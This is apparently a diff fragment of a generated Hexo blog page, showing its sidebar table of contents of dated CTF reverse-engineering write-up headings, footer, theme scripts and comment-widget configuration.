+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">R3n0</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-7"><span class="nav-number">1.</span> <span class="nav-text">2020-5-7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF2019-Akira-Homework-STUCK"><span class="nav-number">1.1.</span> <span class="nav-text">[SUCTF2019]Akira Homework | STUCK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF2019-polyre"><span class="nav-number">1.2.</span> <span class="nav-text">[RoarCTF2019]polyre</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-8"><span class="nav-number">2.</span> <span class="nav-text">2020-5-8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-easy"><span class="nav-number">2.1.</span> <span class="nav-text">[BJDCTF2020]easy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA常用宏定义"><span class="nav-number">2.1.1.</span> <span class="nav-text">IDA常用宏定义</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-9"><span class="nav-number">3.</span> <span class="nav-text">2020-5-9</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Not-Bad"><span class="nav-number">3.1.</span> <span class="nav-text">[极客大挑战 2019]Not Bad</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-10"><span class="nav-number">4.</span> <span class="nav-text">2020-5-10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn2-very-success"><span class="nav-number">4.1.</span> <span class="nav-text">[FlareOn2]very_success</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#singal"><span class="nav-number">4.2.</span> <span class="nav-text">singal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jocker"><span class="nav-number">4.3.</span> <span class="nav-text">Jocker</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-11"><span class="nav-number">5.</span> <span class="nav-text">2020-5-11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-12"><span class="nav-number">6.</span> <span class="nav-text">2020-5-12</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#What’s-Virtialization"><span class="nav-number">6.1.</span> <span class="nav-text">What’s Virtialization</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-13"><span class="nav-number">7.</span> <span class="nav-text">2020-5-13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-14"><span class="nav-number">8.</span> <span class="nav-text">2020-5-14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#De1CTF2019-cplusplus"><span class="nav-number">8.1.</span> <span class="nav-text">[De1CTF2019]cplusplus</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-15"><span class="nav-number">9.</span> <span class="nav-text">2020-5-15</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF新生赛2020-rome"><span class="nav-number">9.1.</span> <span class="nav-text">[ACTF新生赛2020]rome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn6-Overlong"><span class="nav-number">9.2.</span> <span class="nav-text">[FlareOn6]Overlong</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-16"><span class="nav-number">10.</span> <span class="nav-text">2020-5-16</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#go-where"><span class="nav-number">10.1.</span> <span class="nav-text">go_where</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-17"><span class="nav-number">11.</span> <span class="nav-text">2020-5-17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-18、19"><span class="nav-number">12.</span> <span class="nav-text">2020-5-18、19</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-公开赛-h01k-re"><span class="nav-number">12.1.</span> <span class="nav-text">[V&amp;N2020 公开赛]h01k_re</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-20、21、22"><span class="nav-number">13.</span> <span class="nav-text">2020-5-20、21、22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-23"><span class="nav-number">14.</span> <span class="nav-text">2020-5-23</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#继续Akira-Homework"><span class="nav-number">14.1.</span> <span class="nav-text">继续Akira Homework</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn5-Ultimate-Minesweeper"><span class="nav-number">14.2.</span> <span class="nav-text">[FlareOn5]Ultimate Minesweeper</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-24"><span class="nav-number">15.</span> <span class="nav-text">2020-5-24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-25"><span class="nav-number">16.</span> <span class="nav-text">2020-5-25</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-Check-1n"><span class="nav-number">16.1.</span> <span class="nav-text">[GKCTF2020]Check_1n</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-BabyDriver"><span class="nav-number">16.2.</span> <span class="nav-text">[GKCTF2020]BabyDriver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-Chelly’s-identity"><span class="nav-number">16.3.</span> <span class="nav-text">[GKCTF2020]Chelly’s identity</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-26"><span class="nav-number">17.</span> <span class="nav-text">2020-5-26</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-5-27、28"><span class="nav-number">18.</span> <span class="nav-text">2020-5-27、28</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-EzMachine"><span class="nav-number">18.1.</span> <span class="nav-text">[GKCTF2020]EzMachine</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-6-2"><span class="nav-number">19.</span> <span class="nav-text">2020-6-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn5"><span class="nav-number">19.1.</span> <span class="nav-text">Pwn5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-buffer-overflow-1"><span class="nav-number">19.2.</span> <span class="nav-text">picoctf_2018_buffer overflow 1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-6-8"><span class="nav-number">20.</span> <span class="nav-text">2020-6-8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn1-5get-it"><span class="nav-number">20.1.</span> <span class="nav-text">[FlareOn1]5get_it</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-6-12"><span class="nav-number">21.</span> <span class="nav-text">2020-6-12</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IAT-Import-Address-Table"><span class="nav-number">21.1.</span> <span class="nav-text">IAT(Import Address Table)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PE装载器把导入函数输入至IAT的顺序"><span class="nav-number">21.1.0.0.1.</span> <span class="nav-text">PE装载器把导入函数输入至IAT的顺序</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EAT"><span class="nav-number">21.2.</span> <span class="nav-text">EAT</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#GetProcAddress-操作原理"><span class="nav-number">21.2.0.0.1.</span> <span class="nav-text">GetProcAddress()操作原理</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-7-14"><span class="nav-number">22.</span> <span class="nav-text">2020-7-14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn2-YUSoMeta"><span class="nav-number">22.1.</span> <span class="nav-text">[FlareOn2]YUSoMeta</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R3n0</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+<div class="BbeiAn-info">
+   	浙ICP备 -
+    <a target="_blank" href="http://www.miitbeian.gov.cn/" style="color:#f0d784"  rel="nofollow">20008512号</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33011102000254" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">浙公网安备 33011102000254号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+<div id="days"></div>
+</script>
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("07/14/2020 15:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="小破站已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'Dr2Wiyq48geKer4TFUJPN8tx-gzGzoHsz',
+        appKey: 'Q6POnbqJVX9Y22FOjWceKBOQ',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
